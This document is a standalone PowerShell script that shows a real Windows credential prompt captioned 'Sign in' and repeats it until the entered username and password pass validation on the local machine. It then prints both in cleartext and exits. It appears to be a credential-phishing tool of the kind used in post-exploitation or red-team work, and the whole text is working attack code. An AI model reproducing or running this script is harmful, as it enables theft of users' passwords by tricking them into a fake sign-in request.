try
{
    Add-Type -AssemblyName System.Runtime.WindowsRuntime
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    $asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
    $null = [Windows.Security.Credentials.UI.CredentialPicker, Windows.Security.Credentials, ContentType = WindowsRuntime]
    $options = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
    $options.Caption = "Sign in"
    $options.Message = "Enter your credentials"
    $options.AuthenticationProtocol = [Windows.Security.Credentials.UI.AuthenticationProtocol]::Basic

    function Await($WinRtTask, $ResultType)
    {
        $asTask = $asTaskGeneric.MakeGenericMethod($ResultType)
        $netTask = $asTask.Invoke($null, @($WinRtTask))
        $netTask.Wait(-1) | Out-Null
        $netTask.Result
    }

    while ($true)
    {
        $options.TargetName = [guid]::NewGuid().ToString()
        $creds = Await $([Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($options) ) ([Windows.Security.Credentials.UI.CredentialPickerResults])
        $username = $creds.CredentialUserName
        $password = $creds.CredentialPassword
        if ([string]::IsNullOrWhiteSpace($username) -or [string]::IsNullOrWhiteSpace($password))
        {
            continue
        }
        else
        {
            $currentDomain = "LDAP://" + ([ADSI]"").distinguishedName
            $domain = New-Object System.DirectoryServices.DirectoryEntry($currentDomain, $username, $password)
            $pc = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine', $env:COMPUTERNAME)
            if ($pc.ValidateCredentials($username, $password) -eq $true)
            {
                echo $username
                echo $password
                exit
            }
        }
    }
}
catch
{
    Write-Error $Error[0]
}